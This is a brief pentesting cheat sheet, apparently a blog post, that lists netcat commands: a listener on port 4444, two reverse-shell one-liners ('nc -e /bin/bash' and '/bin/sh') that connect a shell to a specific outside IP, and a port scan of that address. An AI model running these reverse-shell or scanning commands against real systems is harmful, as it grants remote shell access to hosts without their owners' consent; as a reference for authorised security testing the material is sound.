+++
title = 'Cheat Sheet - Netcat'
date = 2023-01-15T09:00:00-07:00
draft = false
tags = ['cheatsheet', 'networking']
+++

Some useful examples of netcat command that could be used for pentesting

<!--more-->

## Useful commands

```shell
# start a listening server
nc -lvp 4444

# connect to the server
nc 91.134.137.25 4444
# connect to the server with bash or shell
nc -e /bin/bash 91.134.137.25 4444
nc -e /bin/sh 91.134.137.25 4444

# basic port scan
nc -v -n 91.134.137.25 1-1000
```

